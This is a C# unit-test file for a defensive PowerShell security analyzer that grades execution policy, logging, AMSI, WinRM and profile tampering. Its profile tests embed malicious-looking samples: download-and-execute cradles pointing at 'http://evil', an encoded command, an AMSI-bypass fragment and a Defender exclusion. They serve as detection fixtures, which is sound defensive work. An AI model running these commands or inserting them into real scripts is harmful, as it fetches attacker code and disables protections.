using WinSentinel.Core.Audits;
using WinSentinel.Core.Models;
using static WinSentinel.Core.Audits.PowerShellSecurityAnalyzer;

namespace WinSentinel.Tests.Audits;

/// <summary>
/// Deterministic unit tests for the pure <see cref="PowerShellSecurityAnalyzer"/>.
///
/// <see cref="PowerShellAuditTests"/> already exercises the logic through the
/// <see cref="PowerShellAudit.AnalyzeState"/> wrapper; this suite targets the
/// analyzer's own surface directly - the aggregate <see cref="Analyze"/> entry
/// point, the new <see cref="ResolveEffectivePolicy"/> precedence resolver, the
/// list/nullable-returning per-check methods, and edge cases (whitespace policies,
/// "any" trusted host, default state) that the wrapper tests do not reach.
/// </summary>
public class PowerShellSecurityAnalyzerTests
{
    private static PowerShellState SecureState() => new()
    {
        EffectivePolicy = "RemoteSigned",
        LocalMachinePolicy = "RemoteSigned",
        ScriptBlockLoggingEnabled = true,
        ModuleLoggingEnabled = true,
        TranscriptionEnabled = true,
        TranscriptionOutputDir = @"C:\PSTranscripts",
        LanguageMode = "ConstrainedLanguage",
        V2EngineInstalled = false,
        AmsiProviderRegistered = true,
        WinRmRunning = false
    };

    private static PowerShellState InsecureState() => new()
    {
        EffectivePolicy = "Bypass",
        MachinePolicy = "Bypass",
        LanguageMode = "FullLanguage",
        ScriptBlockLoggingEnabled = false,
        ModuleLoggingEnabled = false,
        TranscriptionEnabled = false,
        V2EngineInstalled = true,
        AmsiProviderRegistered = false,
        WinRmRunning = true,
        WinRmPublicAccess = true,
        WinRmTrustedHosts = new List<string> { "*" }
    };

    // ------------------------------------------------------------------
    // Analyze - aggregate entry point
    // ------------------------------------------------------------------

    [Fact]
    public void Analyze_NullState_Throws()
    {
        Assert.Throws<ArgumentNullException>(() => Analyze(null!));
    }

    [Fact]
    public void Analyze_SecureState_HasNoWarningsOrCriticals()
    {
        var findings = Analyze(SecureState());
        Assert.DoesNotContain(findings, f => f.Severity == Severity.Warning);
        Assert.DoesNotContain(findings, f => f.Severity == Severity.Critical);
        Assert.Contains(findings, f => f.Severity == Severity.Pass);
    }

    [Fact]
    public void Analyze_InsecureState_HasCriticalAndWarning()
    {
        var findings = Analyze(InsecureState());
        Assert.Contains(findings, f => f.Severity == Severity.Critical);
        Assert.Contains(findings, f => f.Severity == Severity.Warning);
    }

    [Fact]
    public void Analyze_EveryFinding_HasPowerShellCategory()
    {
        var findings = Analyze(InsecureState());
        Assert.NotEmpty(findings);
        Assert.All(findings, f => Assert.Equal("PowerShell", f.Category));
    }

    [Fact]
    public void Analyze_WarningsAndCriticals_CarryRemediation()
    {
        var findings = Analyze(InsecureState());
        foreach (var f in findings.Where(f => f.Severity is Severity.Warning or Severity.Critical))
        {
            Assert.False(string.IsNullOrWhiteSpace(f.Remediation),
                $"Finding '{f.Title}' is {f.Severity} but has no remediation.");
        }
    }

    [Fact]
    public void Analyze_DefaultState_DoesNotThrowAndProducesFindings()
    {
        // A freshly constructed state (Undefined policy, FullLanguage, AMSI present,
        // WinRM stopped) must still produce a coherent finding set.
        var findings = Analyze(new PowerShellState());
        Assert.NotEmpty(findings);
        Assert.All(findings, f => Assert.False(string.IsNullOrWhiteSpace(f.Title)));
    }

    // ------------------------------------------------------------------
    // ResolveEffectivePolicy - precedence
    // ------------------------------------------------------------------

    [Fact]
    public void ResolveEffectivePolicy_MachineWinsOverEverything()
    {
        var state = new PowerShellState
        {
            MachinePolicy = "Bypass",
            UserPolicy = "AllSigned",
            CurrentUserPolicy = "RemoteSigned",
            LocalMachinePolicy = "Restricted"
        };
        Assert.Equal("Bypass", ResolveEffectivePolicy(state));
    }

    [Fact]
    public void ResolveEffectivePolicy_SkipsUndefinedScopes()
    {
        var state = new PowerShellState
        {
            MachinePolicy = "Undefined",
            UserPolicy = "Undefined",
            ProcessPolicy = "Undefined",
            CurrentUserPolicy = "RemoteSigned",
            LocalMachinePolicy = "Restricted"
        };
        Assert.Equal("RemoteSigned", ResolveEffectivePolicy(state));
    }

    [Fact]
    public void ResolveEffectivePolicy_AllUndefined_ReturnsUndefined()
    {
        Assert.Equal("Undefined", ResolveEffectivePolicy(new PowerShellState()));
    }

    [Fact]
    public void ResolveEffectivePolicy_TreatsWhitespaceAndEmptyAsUnset()
    {
        var state = new PowerShellState
        {
            MachinePolicy = "   ",
            UserPolicy = "",
            ProcessPolicy = "Undefined",
            CurrentUserPolicy = "AllSigned"
        };
        Assert.Equal("AllSigned", ResolveEffectivePolicy(state));
    }

    // ------------------------------------------------------------------
    // CheckExecutionPolicy - returns a list, may carry a GPO warning too
    // ------------------------------------------------------------------

    [Theory]
    [InlineData("Unrestricted")]
    [InlineData("Bypass")]
    public void CheckExecutionPolicy_Insecure_IsCriticalWithFix(string policy)
    {
        var findings = CheckExecutionPolicy(new PowerShellState { EffectivePolicy = policy });
        var crit = Assert.Single(findings, f => f.Severity == Severity.Critical);
        Assert.Contains(policy, crit.Title);
        Assert.Contains("Set-ExecutionPolicy", crit.FixCommand ?? "");
    }

    [Theory]
    [InlineData("RemoteSigned")]
    [InlineData("AllSigned")]
    [InlineData("Restricted")]
    public void CheckExecutionPolicy_Secure_IsSinglePass(string policy)
    {
        var findings = CheckExecutionPolicy(new PowerShellState
        {
            EffectivePolicy = policy,
            LocalMachinePolicy = policy
        });
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Pass, f.Severity);
    }

    [Fact]
    public void CheckExecutionPolicy_BypassViaGpo_EmitsCriticalPlusGpoWarning()
    {
        // Effective Bypass (critical) AND machine scope Bypass (extra GPO warning).
        var findings = CheckExecutionPolicy(new PowerShellState
        {
            EffectivePolicy = "Bypass",
            MachinePolicy = "Bypass"
        });
        Assert.Contains(findings, f => f.Severity == Severity.Critical);
        Assert.Contains(findings, f => f.Severity == Severity.Warning && f.Title.Contains("GPO Machine Policy"));
    }

    [Fact]
    public void CheckExecutionPolicy_UndefinedEverywhere_IsInfo()
    {
        var findings = CheckExecutionPolicy(new PowerShellState
        {
            EffectivePolicy = "Undefined",
            LocalMachinePolicy = "Undefined",
            CurrentUserPolicy = "Undefined"
        });
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Info, f.Severity);
        Assert.Contains("Not Explicitly Set", f.Title);
    }

    // ------------------------------------------------------------------
    // EffectiveExecutionPolicy - single source of truth (precedence-aware)
    // ------------------------------------------------------------------

    [Fact]
    public void EffectiveExecutionPolicy_PrefersExplicitEffectivePolicy()
    {
        // When EffectivePolicy is already resolved (what PowerShellAudit sets), use it
        // verbatim - even if it disagrees with a naive scope read.
        var state = new PowerShellState
        {
            EffectivePolicy = "RemoteSigned",
            CurrentUserPolicy = "Bypass"
        };
        Assert.Equal("RemoteSigned", EffectiveExecutionPolicy(state));
    }

    [Fact]
    public void EffectiveExecutionPolicy_FallsBackToScopePrecedence_WhenEffectiveUnset()
    {
        // EffectivePolicy left at its "Undefined" default -> derive from scopes by
        // precedence rather than silently treating the machine as unconfigured.
        var state = new PowerShellState
        {
            CurrentUserPolicy = "Bypass",
            LocalMachinePolicy = "Restricted"
        };
        Assert.Equal("Bypass", EffectiveExecutionPolicy(state));
    }

    [Fact]
    public void EffectiveExecutionPolicy_AllUnset_IsUndefined()
    {
        Assert.Equal("Undefined", EffectiveExecutionPolicy(new PowerShellState()));
    }

    [Fact]
    public void EffectiveExecutionPolicy_NullState_Throws()
    {
        Assert.Throws<ArgumentNullException>(() => EffectiveExecutionPolicy(null!));
    }

    [Fact]
    public void CheckExecutionPolicy_InsecureScope_WithoutPrecomputedEffective_IsCritical()
    {
        // Regression: a CurrentUser-scope Bypass with EffectivePolicy left unset must
        // still be flagged Critical. Previously CheckExecutionPolicy read the raw
        // (default "Undefined") EffectivePolicy field and reported a benign "Not
        // Explicitly Set" Info - a security false-negative on synthetic state.
        var findings = CheckExecutionPolicy(new PowerShellState
        {
            CurrentUserPolicy = "Bypass"
        });
        var crit = Assert.Single(findings, f => f.Severity == Severity.Critical);
        Assert.Contains("Bypass", crit.Title);
        Assert.DoesNotContain(findings, f => f.Title.Contains("Not Explicitly Set"));
    }

    [Fact]
    public void CheckExecutionPolicy_SecureScope_WithoutPrecomputedEffective_IsPass()
    {
        // The mirror case: a single secure scope resolves to Pass, not the
        // unconfigured Info, even when EffectivePolicy is not pre-set.
        var findings = CheckExecutionPolicy(new PowerShellState
        {
            LocalMachinePolicy = "AllSigned"
        });
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Pass, f.Severity);
        Assert.Contains("AllSigned", f.Title);
    }

    // ------------------------------------------------------------------
    // Individual checks called directly
    // ------------------------------------------------------------------

    [Theory]
    [InlineData(true, Severity.Pass)]
    [InlineData(false, Severity.Warning)]
    public void CheckScriptBlockLogging_MapsEnabledToSeverity(bool enabled, Severity expected)
    {
        var f = CheckScriptBlockLogging(new PowerShellState { ScriptBlockLoggingEnabled = enabled });
        Assert.Equal(expected, f.Severity);
    }

    [Theory]
    [InlineData(true, Severity.Pass)]
    [InlineData(false, Severity.Warning)]
    public void CheckModuleLogging_MapsEnabledToSeverity(bool enabled, Severity expected)
    {
        var f = CheckModuleLogging(new PowerShellState { ModuleLoggingEnabled = enabled });
        Assert.Equal(expected, f.Severity);
    }

    // Explicitly disabled (registry value present and 0) is a tamper signal graded
    // Critical, kept distinct from the Warning emitted when logging is merely unset.
    [Fact]
    public void CheckScriptBlockLogging_ExplicitlyDisabled_IsCriticalTamperSignal()
    {
        var f = CheckScriptBlockLogging(new PowerShellState
        {
            ScriptBlockLoggingEnabled = false,
            ScriptBlockLoggingExplicitlyDisabled = true
        });
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.Contains("Explicitly Disabled", f.Title);
        Assert.Contains("T1562.002", f.Description);
        Assert.False(string.IsNullOrWhiteSpace(f.Remediation),
            "a Critical tamper finding must carry remediation");
    }

    [Fact]
    public void CheckModuleLogging_ExplicitlyDisabled_IsCriticalTamperSignal()
    {
        var f = CheckModuleLogging(new PowerShellState
        {
            ModuleLoggingEnabled = false,
            ModuleLoggingExplicitlyDisabled = true
        });
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.Contains("Explicitly Disabled", f.Title);
        Assert.Contains("T1562.002", f.Description);
        Assert.False(string.IsNullOrWhiteSpace(f.Remediation),
            "a Critical tamper finding must carry remediation");
    }

    // "Explicitly disabled" (value 0) and "never configured" (value absent) must be
    // graded differently so an operator can tell active suppression from a hygiene
    // gap: Critical vs Warning, with distinct titles.
    [Fact]
    public void CheckScriptBlockLogging_DisabledVsUnset_AreDistinctFindings()
    {
        var tampered = CheckScriptBlockLogging(new PowerShellState
        {
            ScriptBlockLoggingExplicitlyDisabled = true
        });
        var unset = CheckScriptBlockLogging(new PowerShellState
        {
            ScriptBlockLoggingEnabled = false,
            ScriptBlockLoggingExplicitlyDisabled = false
        });
        Assert.Equal(Severity.Critical, tampered.Severity);
        Assert.Equal(Severity.Warning, unset.Severity);
        Assert.NotEqual(tampered.Title, unset.Title);
    }

    [Fact]
    public void CheckModuleLogging_DisabledVsUnset_AreDistinctFindings()
    {
        var tampered = CheckModuleLogging(new PowerShellState
        {
            ModuleLoggingExplicitlyDisabled = true
        });
        var unset = CheckModuleLogging(new PowerShellState
        {
            ModuleLoggingEnabled = false,
            ModuleLoggingExplicitlyDisabled = false
        });
        Assert.Equal(Severity.Critical, tampered.Severity);
        Assert.Equal(Severity.Warning, unset.Severity);
        Assert.NotEqual(tampered.Title, unset.Title);
    }

    [Fact]
    public void CheckTranscription_EnabledWithDir_MentionsDirInPass()
    {
        var f = CheckTranscription(new PowerShellState
        {
            TranscriptionEnabled = true,
            TranscriptionOutputDir = @"D:\Logs\PS"
        });
        Assert.Equal(Severity.Pass, f.Severity);
        Assert.Contains(@"D:\Logs\PS", f.Description);
    }

    [Fact]
    public void CheckTranscription_EnabledNoDir_NotesDefaultLocation()
    {
        var f = CheckTranscription(new PowerShellState { TranscriptionEnabled = true });
        Assert.Equal(Severity.Pass, f.Severity);
        Assert.Contains("defaults to user's Documents", f.Description);
    }

    [Fact]
    public void CheckTranscription_Disabled_IsInfo()
    {
        var f = CheckTranscription(new PowerShellState { TranscriptionEnabled = false });
        Assert.Equal(Severity.Info, f.Severity);
    }

    [Theory]
    [InlineData("FullLanguage", Severity.Info)]
    [InlineData("ConstrainedLanguage", Severity.Pass)]
    [InlineData("RestrictedLanguage", Severity.Info)]
    [InlineData("NoLanguage", Severity.Info)]
    public void CheckLanguageMode_MapsModeToSeverity(string mode, Severity expected)
    {
        var f = CheckLanguageMode(new PowerShellState { LanguageMode = mode });
        Assert.Equal(expected, f.Severity);
    }

    [Theory]
    [InlineData(true, Severity.Warning)]
    [InlineData(false, Severity.Pass)]
    public void CheckV2Engine_MapsInstalledToSeverity(bool installed, Severity expected)
    {
        var f = CheckV2Engine(new PowerShellState { V2EngineInstalled = installed });
        Assert.Equal(expected, f.Severity);
    }

    [Fact]
    public void CheckV2Engine_Warning_MentionsDowngradeAndHasDisableCommand()
    {
        var f = CheckV2Engine(new PowerShellState { V2EngineInstalled = true });
        Assert.Contains("downgrade", f.Description, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("Disable-WindowsOptionalFeature", f.FixCommand ?? "");
    }

    [Theory]
    [InlineData(true, Severity.Pass)]
    [InlineData(false, Severity.Critical)]
    public void CheckAmsi_MapsRegistrationToSeverity(bool registered, Severity expected)
    {
        var f = CheckAmsi(new PowerShellState { AmsiProviderRegistered = registered });
        Assert.Equal(expected, f.Severity);
    }

    // ------------------------------------------------------------------
    // CheckRemoting - list-returning, several branches
    // ------------------------------------------------------------------

    [Fact]
    public void CheckRemoting_NotRunning_IsSinglePass()
    {
        var findings = CheckRemoting(new PowerShellState { WinRmRunning = false });
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Pass, f.Severity);
        Assert.Contains("Not Running", f.Title);
    }

    [Fact]
    public void CheckRemoting_NotRunning_IgnoresTrustedHosts()
    {
        // Even with a wildcard configured, a stopped service must not raise a critical.
        var findings = CheckRemoting(new PowerShellState
        {
            WinRmRunning = false,
            WinRmTrustedHosts = new List<string> { "*" }
        });
        Assert.DoesNotContain(findings, f => f.Severity == Severity.Critical);
    }

    [Fact]
    public void CheckRemoting_RunningWildcard_IsCritical()
    {
        var findings = CheckRemoting(new PowerShellState
        {
            WinRmRunning = true,
            WinRmTrustedHosts = new List<string> { "*" }
        });
        Assert.Contains(findings, f => f.Severity == Severity.Info && f.Title.Contains("WinRM Service Running"));
        Assert.Contains(findings, f => f.Severity == Severity.Critical && f.Title.Contains("Wildcard"));
    }

    [Fact]
    public void CheckRemoting_RunningTrustedHostAny_IsCritical()
    {
        // "any" is the case-insensitive equivalent of "*".
        var findings = CheckRemoting(new PowerShellState
        {
            WinRmRunning = true,
            WinRmTrustedHosts = new List<string> { "ANY" }
        });
        Assert.Contains(findings, f => f.Severity == Severity.Critical && f.Title.Contains("Wildcard"));
    }

    [Fact]
    public void CheckRemoting_RunningSpecificHosts_IsInfoNotCritical()
    {
        var findings = CheckRemoting(new PowerShellState
        {
            WinRmRunning = true,
            WinRmTrustedHosts = new List<string> { "build01", "build02" }
        });
        Assert.DoesNotContain(findings, f => f.Severity == Severity.Critical);
        Assert.Contains(findings, f => f.Severity == Severity.Info && f.Title.Contains("2 entries"));
    }

    [Fact]
    public void CheckRemoting_PublicAccess_RaisesWarning()
    {
        var findings = CheckRemoting(new PowerShellState
        {
            WinRmRunning = true,
            WinRmPublicAccess = true
        });
        Assert.Contains(findings, f => f.Severity == Severity.Warning && f.Title.Contains("Public Networks"));
    }

    // ------------------------------------------------------------------
    // CheckVersions - nullable
    // ------------------------------------------------------------------

    [Fact]
    public void CheckVersions_Empty_ReturnsNull()
    {
        Assert.Null(CheckVersions(new PowerShellState()));
    }

    [Fact]
    public void CheckVersions_NonEmpty_IsInfoWithCountAndNames()
    {
        var f = CheckVersions(new PowerShellState
        {
            InstalledVersions = new List<string> { "Windows PowerShell 5.1.0", "PowerShell 7.4" }
        });
        Assert.NotNull(f);
        Assert.Equal(Severity.Info, f!.Severity);
        Assert.Contains("2", f.Title);
        Assert.Contains("PowerShell 7.4", f.Description);
    }

    [Fact]
    public void CheckVersions_EmptyList_OmittedFromAggregate()
    {
        var findings = Analyze(SecureState()); // SecureState leaves InstalledVersions empty
        Assert.DoesNotContain(findings, f => f.Title.StartsWith("PowerShell Versions Installed"));
    }

    // ------------------------------------------------------------------
    // Policy set surfaces
    // ------------------------------------------------------------------

    [Fact]
    public void InsecurePolicies_AreCaseInsensitiveAndExpected()
    {
        Assert.Contains("unrestricted", InsecurePolicies);
        Assert.Contains("BYPASS", InsecurePolicies);
        Assert.Equal(2, InsecurePolicies.Count);
    }

    [Fact]
    public void SecurePolicies_ContainExpectedValues()
    {
        Assert.Contains("AllSigned", SecurePolicies);
        Assert.Contains("RemoteSigned", SecurePolicies);
        Assert.Contains("Restricted", SecurePolicies);
    }

    [Fact]
    public void Analyzer_And_AuditExpose_SamePolicySets()
    {
        // The audit's forwarding properties must stay lock-step with the analyzer.
        Assert.Same(PowerShellSecurityAnalyzer.InsecurePolicies, PowerShellAudit.InsecurePolicies);
        Assert.Same(PowerShellSecurityAnalyzer.SecurePolicies, PowerShellAudit.SecurePolicies);
    }

    // ------------------------------------------------------------------
    // CheckProfiles - profile.ps1 tampering (T1546.013)
    // ------------------------------------------------------------------

    private static PowerShellProfileInfo Profile(string content, bool machineWide = false,
        string scope = "CurrentUserCurrentHost", string path = @"C:\Users\me\Documents\PowerShell\profile.ps1")
        => new() { Content = content, IsMachineWide = machineWide, Scope = scope, Path = path };

    [Fact]
    public void CheckProfiles_NullState_Throws()
    {
        Assert.Throws<ArgumentNullException>(() => CheckProfiles(null!));
    }

    [Fact]
    public void CheckProfiles_NoProfiles_IsSinglePass()
    {
        var findings = CheckProfiles(new PowerShellState());
        Assert.Single(findings);
        Assert.Equal(Severity.Pass, findings[0].Severity);
        Assert.Contains("No PowerShell Profile", findings[0].Title);
    }

    [Fact]
    public void CheckProfiles_CleanPerUserProfile_IsPass()
    {
        var state = new PowerShellState
        {
            Profiles = { Profile("Set-Alias ll Get-ChildItem\n$PSStyle.OutputRendering = 'Ansi'") }
        };
        var findings = CheckProfiles(state);
        Assert.Single(findings);
        Assert.Equal(Severity.Pass, findings[0].Severity);
        Assert.Contains("Clean", findings[0].Title);
    }

    [Fact]
    public void CheckProfiles_PerUserDownloadCradle_IsWarning()
    {
        var state = new PowerShellState
        {
            Profiles = { Profile("IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')") }
        };
        var findings = CheckProfiles(state);
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Warning, f.Severity);
        Assert.Contains("Suspicious PowerShell Profile", f.Title);
        Assert.Contains("DownloadString", f.Description);       // reason surfaced
        Assert.Contains("T1546.013", f.Description);            // MITRE technique cited
        Assert.NotNull(f.Remediation);
    }

    [Fact]
    public void CheckProfiles_MachineWideMalicious_IsCritical()
    {
        var state = new PowerShellState
        {
            Profiles =
            {
                Profile("powershell -EncodedCommand ZQBjAGgAbwA=",
                    machineWide: true, scope: "AllUsersAllHosts",
                    path: @"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1")
            }
        };
        var findings = CheckProfiles(state);
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Critical, f.Severity);
        Assert.Contains("machine-wide", f.Description);
    }

    [Fact]
    public void CheckProfiles_MachineWideClean_IsInfo()
    {
        var state = new PowerShellState
        {
            Profiles =
            {
                Profile("# corporate banner\nWrite-Host 'Welcome'",
                    machineWide: true, scope: "AllUsersCurrentHost")
            }
        };
        var findings = CheckProfiles(state);
        var f = Assert.Single(findings);
        Assert.Equal(Severity.Info, f.Severity);
        Assert.Contains("Machine-Wide", f.Title);
    }

    [Fact]
    public void CheckProfiles_AmsiBypass_IsFlagged()
    {
        var state = new PowerShellState
        {
            Profiles = { Profile("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')") }
        };
        var f = Assert.Single(CheckProfiles(state));
        Assert.Equal(Severity.Warning, f.Severity);
        Assert.Contains("AMSI", f.Description);
    }

    [Fact]
    public void CheckProfiles_MultipleProfiles_GradesEachIndependently()
    {
        var state = new PowerShellState
        {
            Profiles =
            {
                Profile("Set-Alias g git"),                                            // clean per-user
                Profile("iex (irm http://evil/p)", scope: "CurrentUserAllHosts"),       // malicious per-user
                Profile("Write-Host hi", machineWide: true, scope: "AllUsersAllHosts")  // clean machine-wide
            }
        };
        var findings = CheckProfiles(state);
        // malicious per-user -> Warning; clean machine-wide -> Info; clean per-user contributes nothing
        // (and because at least one finding was produced, no summary Pass is appended).
        Assert.Contains(findings, f => f.Severity == Severity.Warning);
        Assert.Contains(findings, f => f.Severity == Severity.Info);
        Assert.DoesNotContain(findings, f => f.Severity == Severity.Pass);
        Assert.Equal(2, findings.Count);
    }

    [Fact]
    public void CheckProfiles_UnreadableMachineWide_NullContentStillInfo()
    {
        // Collector records a machine-wide profile it could not read (Content == null):
        // presence alone should still surface as Info, not silently drop.
        var state = new PowerShellState
        {
            Profiles = { Profile(null!, machineWide: true, scope: "AllUsersAllHosts") }
        };
        var f = Assert.Single(CheckProfiles(state));
        Assert.Equal(Severity.Info, f.Severity);
    }

    [Theory]
    [InlineData("Invoke-Expression $x", "Invoke-Expression")]
    [InlineData("[Convert]::FromBase64String($b)", "base64")]
    [InlineData("Add-MpPreference -ExclusionPath C:\\", "Defender")]
    [InlineData("Start-Process pwsh -WindowStyle Hidden", "hidden")]
    public void ScanProfileContent_KnownBadTokens_AreDetected(string content, string expectReasonSubstring)
    {
        var reasons = ScanProfileContent(content);
        Assert.NotEmpty(reasons);
        Assert.Contains(reasons, r => r.Contains(expectReasonSubstring, StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void ScanProfileContent_NullOrBlank_IsEmpty()
    {
        Assert.Empty(ScanProfileContent(null));
        Assert.Empty(ScanProfileContent("   "));
    }

    [Fact]
    public void ScanProfileContent_CleanContent_IsEmpty()
    {
        Assert.Empty(ScanProfileContent("Set-Alias ll Get-ChildItem; $ErrorActionPreference='Stop'"));
    }

    [Fact]
    public void ScanProfileContent_IsCaseInsensitive()
    {
        Assert.NotEmpty(ScanProfileContent("IEX ($code)"));
        Assert.NotEmpty(ScanProfileContent("iex ($code)"));
    }

    [Fact]
    public void ScanProfileContent_DeDuplicatesReasons()
    {
        // Two tokens map to the same "AMSI-bypass tampering" family but distinct reasons;
        // a single reason must never be reported twice for one profile.
        var reasons = ScanProfileContent("iex; Invoke-Expression; iex");
        Assert.Equal(reasons.Count, reasons.Distinct().Count());
    }

    [Fact]
    public void Analyze_IncludesProfileFinding()
    {
        // The aggregate entry point must now surface profile results (a Pass here,
        // since the default state has no profiles).
        var findings = Analyze(new PowerShellState());
        Assert.Contains(findings, f =>
            f.Category == Category &&
            (f.Title.Contains("Profile") || f.Title.Contains("profile")));
    }
}
